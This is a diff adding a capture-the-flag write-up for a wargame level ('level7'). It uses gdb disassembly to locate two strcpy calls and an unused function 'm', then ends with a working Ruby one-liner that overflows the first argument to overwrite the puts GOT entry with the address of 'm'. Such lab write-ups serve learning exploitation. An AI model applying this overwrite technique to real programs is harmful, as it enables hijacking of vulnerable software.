@@ -1,0 +1,39 @@
+When launching the binary notice that there is a segfault when we have less than 2 arguments.
+
+For this level we will use the strcpy vulnerability.
+    (gdb) disass main
+    ...
+    0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
+    0x080485a5 <+132>:   mov    0xc(%ebp),%eax
+    0x080485a8 <+135>:   add    $0x8,%eax
+    0x080485ab <+138>:   mov    (%eax),%eax
+    0x080485ad <+140>:   mov    %eax,%edx
+    0x080485af <+142>:   mov    0x18(%esp),%eax
+    0x080485b3 <+146>:   mov    0x4(%eax),%eax
+    0x080485b6 <+149>:   mov    %edx,0x4(%esp)
+    0x080485ba <+153>:   mov    %eax,(%esp)
+    0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
+    ...
+
+We look for functions and we can see that there is an unused function 'm'
+    (gdb) info functions
+    0x080484f4  m
+    0x08048521  main
+And we will try to call it with a buffer overflow.
+
+We can see 2 strcpy and we also know that we have to pass 2 arguments.
+
+At the end of the main function, there is a call to puts
+    0x080485f7 <+214>:   call   0x8048400 <puts@plt>
+    (gdb) disass 0x8048400
+    0x08048400 <+0>:     jmp    *0x8049928
+    0x08048406 <+6>:     push   $0x28
+    0x0804840b <+11>:    jmp    0x80483a0
+
+The * before an address means it is an indirect jmp.
+In direct jmp, the address is encoded in the jmp function itself se it can't be overwritten.
+For indirect jmp, the addess is specified through memory so we can change it with an overflow.
+So we will change this address for the address of our target function 'm'.
+
+
+$ ./level7 $(ruby -e 'print "A" * 20 + "\x28\x99\x04\x08"') $(ruby -e 'print "\xf4\x84\x04\x08"')
